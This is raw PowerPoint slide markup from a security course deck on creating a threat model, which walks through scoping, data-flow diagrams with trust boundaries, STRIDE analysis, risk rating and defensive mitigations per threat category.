        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Frame the scope</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Define the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>in/out of scope</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, primary </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>assets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (user data, keys, money), and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>actors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (user, admin, attacker, third-party APIs).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Decide where you’ll store findings (repo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/threat-model/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0D0D0D"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> folder + tickets)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0D0D0D"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2165931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1573-C519-1732-14E3-FFB68F227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970EB-EE00-3D58-4FCB-E35CF25655D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD250255-AEB5-6A27-F818-36820DD42457}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8816427" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Draw the system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Sketch a quick </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>DFD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> or architecture diagram with components: processes, data stores, external entities, data flows.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mark </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>trust boundaries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (browser ↔ backend, VPC ↔ Internet, service ↔ DB)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30685527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7F707-8E86-EDC2-FF5F-98CCE953B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C49C1-AC2E-BE9F-46E0-FCAB450D484F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0FC28DCC-EEEE-0EAB-7006-5A1D08C181E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="8816427" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Draw the system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Sketch a quick </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>DFD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> or architecture diagram with components: processes, data stores, external entities, data flows.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mark </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>trust boundaries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (browser ↔ backend, VPC ↔ Internet, service ↔ DB)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2489601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2C929-2567-CB78-7A6C-CF1E843C1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C43CD-54CB-CF1B-BDC3-F37D8F99DF11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 04</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7911B0E4-AC1A-B857-C89E-79FBF3F82E3E}"/>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Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>STRIDE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> per element</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>S – Spoofing:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> how could identity be faked?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>T – Tampering:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> how could data/code be altered?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>R – Repudiation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> could actions be denied or logs forged?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>I – Information Disclosure:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> what could leak?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>D – Denial of Service:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> what could be exhausted?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>E – Elevation of Privilege:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> any unintended powers/paths?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25977889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DD0F-3D8B-3DE3-F60C-967F8686F1D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360EF6-4ADD-9696-2836-444A5440E213}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4637279" y="2611051"/>
            <a:ext cx="7099738" cy="3811095"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2CAE53F9-BF09-F8B7-FE59-93B0F3979113}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 05</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BEF9F144-4DB1-9812-9C34-3C4A41BCF26F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5240481" cy="2185847"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Rate the risk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Score </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Likelihood</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (L) and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Impact</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (I) as Low/Med/High</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Note </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>preconditions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (e.g., “needs network MITM”).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4488591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53449-555B-C3C6-77DF-60976397A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1BC3F-CDBE-2186-38F3-FB30EC080B33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Creating a Threat Model – Step 06</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{21011E74-10AF-C1B6-BAAE-4672DC66D686}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9166771" cy="5052027"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Use checklists per STRIDE category:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>S:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> strong auth (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>WebAuthn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/OAuth/OIDC), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, rotate credentials.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>T:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> input validation, signatures/HMAC, checksums, immutability, code signing, supply-chain controls</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>R:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> tamper-evident logs, unique accounts (no shared admin), audit retention.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>I:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> least privilege (IAM), encryption in transit/at rest, secret management, output encoding, data minimization.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>D:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> rate limits, circuit breakers, backpressure/queues, cache, autoscaling, WAF.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>E:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> least privilege defaults, strict RBAC, defense-in-depth, sandboxing, SSRF egress controls, safe deserialization.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
